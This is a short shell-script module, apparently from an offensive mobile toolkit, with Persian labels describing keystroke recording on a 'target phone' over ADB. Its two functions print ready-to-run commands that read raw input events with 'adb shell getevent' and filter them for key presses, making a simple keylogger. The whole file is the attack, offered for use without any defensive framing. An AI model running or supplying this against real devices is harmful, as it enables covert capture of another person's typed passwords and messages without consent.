DESC="ثبت کلیدهای فشرده‌شده روی گوشی هدف"
REQ="ADB"
RISK="MED"
NOTE="همه‌ی کلیدها را نمی‌گیرد؛ فقط ورودی‌های فیزیکی/soft keyboard را می‌بیند"

termux(){ echo "getevent -lt /dev/input/event1"; }

kali(){
cat <<'EOF'
adb shell getevent -lt | grep -E 'KEYCODE|EV_KEY' 
# یا خواناتر:
adb shell getevent -lt /dev/input/event1 | while read -r l; do
  echo "$l" | grep -q 'KEY_' && echo "$l"
done
EOF
}
